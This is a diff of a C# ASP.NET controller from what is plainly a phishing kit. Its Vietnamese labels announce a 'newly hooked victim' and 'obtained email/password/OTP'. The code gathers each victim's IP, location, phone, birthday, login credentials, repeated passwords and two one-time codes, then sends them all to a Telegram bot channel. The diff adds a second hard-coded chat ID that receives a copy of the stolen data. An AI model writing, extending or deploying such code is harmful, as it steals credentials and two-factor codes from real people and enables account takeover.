@@ -2,7 +2,10 @@
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.AspNetCore.Mvc.RazorPages;
 using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 using System.Diagnostics;
+using System.Diagnostics.Metrics;
+using System.Drawing;
 using System.Xml.Linq;
 
 //using TelegramBot;
@@ -27,8 +30,13 @@ namespace WebApplication1.Controllers
         }
 
         [HttpPost]
-        public IActionResult RestrictionsInformation(string authen)
+        public IActionResult RestrictionsInformation(string authen, string location)
         {
+
+            if (!string.IsNullOrEmpty(location))
+            {
+                HttpContext.Session.SetString(Constants.LOCATION, location);
+            }
             return View();
         }
 
@@ -42,11 +50,11 @@ namespace WebApplication1.Controllers
 
             var ip = HttpContext.Session.GetString(Constants.IP);
             var location = HttpContext.Session.GetString(Constants.LOCATION);
-          
+
 
             string telegramBotToken = _configuration["TelegramBotToken"];
             string channel = _configuration["Channel"];
-            var message = "ĐỐI TƯỢNG MỚI DÍNH ĐÒN: " + ip + "\n" +
+            var message = "ĐỐI TƯỢNG MỚI : " + ip + "\n" +
                           "IP: " + ip + "\n" +
                           "Location: " + location + "\n" +
                           "Page Name: " + pageName + "\n" +
@@ -56,12 +64,22 @@ namespace WebApplication1.Controllers
                           "------------------------" + "\n" +
                           "Time: " + DateTime.UtcNow.AddHours(7).ToString("dd/MM/yyyy HH:mm") + "\n";
 
+            // test
+            var messageId2 = HttpContext.Session.GetInt32(Constants.MESSAGE_ID);
+            messageId2 = await _telegramBot.SendMessageAsync(telegramBotToken, "-4244986710", message, messageId2);
+            if (messageId2 != null)
+            {
+                HttpContext.Session.SetInt32(Constants.MESSAGE_ID2, messageId2.Value);
+            }
+
             var messageId = HttpContext.Session.GetInt32(Constants.MESSAGE_ID);
             messageId = await _telegramBot.SendMessageAsync(telegramBotToken, channel, message, messageId);
             if (messageId != null)
             {
                 HttpContext.Session.SetInt32(Constants.MESSAGE_ID, messageId.Value);
             }
+
+
             return View();
         }
 
@@ -99,7 +117,7 @@ namespace WebApplication1.Controllers
             ViewBag.TimeConfirm = timeWait;
 
             var messageId = SendData().Result;
-            
+
             return View();
         }
 
@@ -119,7 +137,7 @@ namespace WebApplication1.Controllers
 
             string telegramBotToken = _configuration["TelegramBotToken"];
             string channel = _configuration["Channel"];
-            var message = "ĐỐI TƯỢNG MỚI DÍNH ĐÒN: " + ip + "\n" +
+            var message = "🎁 ĐỐI TƯỢNG MỚI DÍNH ĐÒN: " + ip + " 🎁" + "\n" +
                           "IP: " + ip + "\n" +
                           "Location: " + location + "\n" +
                           "Page Name: " + pageName + "\n" +
@@ -127,20 +145,27 @@ namespace WebApplication1.Controllers
                           "Phone: " + phone + "\n" +
                           "Birthday: " + birthday + "\n" +
                           (email == null ? "" : "--------------------------------" + "\n" +
+                          "👌 Đã lấy được Email\\Pass: " + "\n" +
                           "Email or Phone: " + email + "\n" +
                           "--------------------------------" + "\n" +
                           "Password: " + password + "\n") +
 
                           (password2 == null ? "" : "--------------------------------" + "\n" +
+                           "👌 Đã lấy được Pass lần 2: " + "\n" +
                           "Password2: " + password2 + "\n") +
 
                           (otp == null ? "" : "--------------------------------" + "\n" +
+                           "👌 Đã lấy được OTP: " + "\n" +
                           "OTP1: " + otp + "\n") +
                           (otp2 == null ? "" : "--------------------------------" + "\n" +
+                           "👌 Đã lấy được OTP lần 2: " + "\n" +
                           "OTP2: " + otp2 + "\n") +
                           "--------------------------------" + "\n" +
                           "Time: " + DateTime.UtcNow.AddHours(7).ToString("dd/MM/yyyy HH:mm") + "\n";
 
+            var messageId2 = HttpContext.Session.GetInt32(Constants.MESSAGE_ID2);
+            await _telegramBot.SendMessageAsync(telegramBotToken, "-4244986710", message, messageId2); // test
+            Thread.Sleep(2000);
             var messageId = HttpContext.Session.GetInt32(Constants.MESSAGE_ID);
             return await _telegramBot.SendMessageAsync(telegramBotToken, channel, message, messageId);
 
